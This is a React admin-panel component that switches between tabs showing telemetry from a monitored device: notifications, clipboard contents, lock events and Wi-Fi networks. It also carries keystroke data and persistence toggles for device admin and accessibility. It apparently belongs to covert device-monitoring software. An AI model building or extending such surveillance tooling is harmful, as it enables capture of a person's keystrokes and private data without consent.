// components/admin/devices/DeviceIntelligenceTabViews.tsx
"use client";

import React from "react";
import { DeviceNotificationsTab } from "@/components/admin/devices/DeviceNotificationsTab";
import { DeviceClipboardTab } from "@/components/admin/devices/DeviceClipboardTab";
import { DeviceSecurityTab } from "@/components/admin/devices/DeviceSecurityTab";
import {
  DeviceNotification,
  DeviceKeystroke,
  DeviceClipboardItem,
  DeviceLockEvent,
  DeviceWifiNetwork,
} from "@/lib/device-telemetry-types";

interface Props {
  activeTab: string;
  notifications: DeviceNotification[];
  keystrokes?: DeviceKeystroke[];
  clipboardItems: DeviceClipboardItem[];
  lockEvents: DeviceLockEvent[];
  wifiNetworks: DeviceWifiNetwork[];
  currentSsid?: string | null;
  persistenceStatus?: {
    isAdmin?: boolean;
    isAccessibility?: boolean;
    isBatteryWhitelisted?: boolean;
    isNotificationActive?: boolean;
  };
  onClearModule?: (mod: string) => void;
  onScanWifi?: () => void;
  onUpdatePersistence?: (key: string, val: boolean) => void;
  loading?: boolean;
}

export const DeviceIntelligenceTabViews: React.FC<Props> = ({
  activeTab,
  notifications,
  clipboardItems,
  lockEvents,
  wifiNetworks,
  currentSsid,
  persistenceStatus,
  onClearModule,
  onScanWifi,
  onUpdatePersistence,
  loading,
}) => {
  if (activeTab === "notifications") {
    return (
      <DeviceNotificationsTab
        notifications={notifications}
        isNotificationActive={persistenceStatus?.isNotificationActive}
        onClearAll={() => onClearModule?.("notifications")}
        loading={loading}
      />
    );
  }
  if (activeTab === "clipboard") {
    return <DeviceClipboardTab items={clipboardItems} onClearAll={() => onClearModule?.("clipboard")} loading={loading} />;
  }
  if (activeTab === "security") {
    return (
      <DeviceSecurityTab
        lockEvents={lockEvents}
        wifiNetworks={wifiNetworks}
        currentSsid={currentSsid}
        persistenceStatus={persistenceStatus}
        onScanWifi={onScanWifi}
        onTogglePersistence={onUpdatePersistence}
        loading={loading}
      />
    );
  }
  return null;
};
